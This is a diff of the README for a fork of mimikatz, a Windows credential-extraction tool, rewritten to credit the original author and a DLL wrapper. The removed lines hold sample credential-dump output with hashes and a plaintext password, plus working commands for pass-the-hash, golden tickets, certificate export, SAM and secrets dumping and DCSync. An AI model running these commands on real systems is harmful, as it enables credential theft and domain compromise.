@@ -1,95 +1,14 @@
 # mimikatz
 
-**`mimikatz`** is a tool I've made to learn `C` and make somes experiments with Windows security.
+**`mimikatz`** is a tool `gentilkiwi` made to learn `C` and make somes experiments with Windows security and forked by me to wrap it in dll library in `guardicore` fork way.
 
 It's now well known to extract plaintexts passwords, hash, PIN code and kerberos tickets from memory. **`mimikatz`** can also perform pass-the-hash, pass-the-ticket or build _Golden tickets_.
 
-```
-  .#####.   mimikatz 2.0 alpha (x86) release "Kiwi en C" (Apr  6 2014 22:02:03)
- .## ^ ##.
- ## / \ ##  /* * *
- ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
- '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
-  '#####'                                    with  13 modules * * */
+`Crypto`, `Terminal Server`, `Events`, ... lots of informations in the GitHub Wiki https://github.com/gentilkiwi/mimikatz/wiki or on http://blog.gentilkiwi.com (in French, _yes_).
+
+If you don't want to build it, original binaries are availables on https://github.com/gentilkiwi/mimikatz/releases, wrapped binaries are available on https://github.com/Mathtin/mimikatz/releases
 
 
-mimikatz # privilege::debug
-Privilege '20' OK
- 
-mimikatz # sekurlsa::logonpasswords
- 
-Authentication Id : 0 ; 515764 (00000000:0007deb4)
-Session           : Interactive from 2
-User Name         : Gentil Kiwi
-Domain            : vm-w7-ult-x
-SID               : S-1-5-21-1982681256-1210654043-1600862990-1000
-        msv :
-         [00000003] Primary
-         * Username : Gentil Kiwi
-         * Domain   : vm-w7-ult-x
-         * LM       : d0e9aee149655a6075e4540af1f22d3b
-         * NTLM     : cc36cf7a8514893efccd332446158b1a
-         * SHA1     : a299912f3dc7cf0023aef8e4361abfc03e9a8c30
-        tspkg :
-         * Username : Gentil Kiwi
-         * Domain   : vm-w7-ult-x
-         * Password : waza1234/
-...
-```
-But that's not all! `Crypto`, `Terminal Server`, `Events`, ... lots of informations in the GitHub Wiki https://github.com/gentilkiwi/mimikatz/wiki or on http://blog.gentilkiwi.com (in French, _yes_).
-
-If you don't want to build it, binaries are availables on https://github.com/gentilkiwi/mimikatz/releases
-
-
-## Quick usage
-```
-log
-privilege::debug
-```
-
-### sekurlsa
-```
-sekurlsa::logonpasswords
-sekurlsa::tickets /export
-
-sekurlsa::pth /user:Administrateur /domain:winxp /ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd
-```
-
-### kerberos
-```
-kerberos::list /export
-kerberos::ptt c:\chocolate.kirbi
-
-kerberos::golden /admin:administrateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /ticket:chocolate.kirbi
-```
-
-### crypto
-```
-crypto::capi
-crypto::cng
-
-crypto::certificates /export
-crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE
-
-crypto::keys /export
-crypto::keys /machine /export
-```
-
-### vault & lsadump
-```
-vault::cred
-vault::list
-
-token::elevate
-vault::cred
-vault::list
-lsadump::sam
-lsadump::secrets
-lsadump::cache
-token::revert
-
-lsadump::dcsync /user:domain\krbtgt /domain:lab.local
-```
 
 ## Build
 `mimikatz` is in the form of a Visual Studio Solution and a WinDDK driver (optional for main operations), so prerequisites are:
@@ -129,5 +48,6 @@ CC BY 4.0 licence - https://creativecommons.org/licenses/by/4.0/
 ## Author
 * Benjamin DELPY `gentilkiwi`, you can contact me on Twitter ( @gentilkiwi ) or by mail ( benjamin [at] gentilkiwi.com )
 * DCSync function in `lsadump` module was co-writed with Vincent LE TOUX, you can contact him by mail ( vincent.letoux [at] gmail.com ) or visit his website ( http://www.mysmartlogon.com )
+* Wrap changes was taken from `guardicore` repo as for 2584e1666da75584ac9e9e7aaf2b586b3eea16bc merge by Daniel Goldberg ( https://github.com/danielguardicore )
 
 This is a **personal** development, please respect its philosophy and don't use it for bad things!
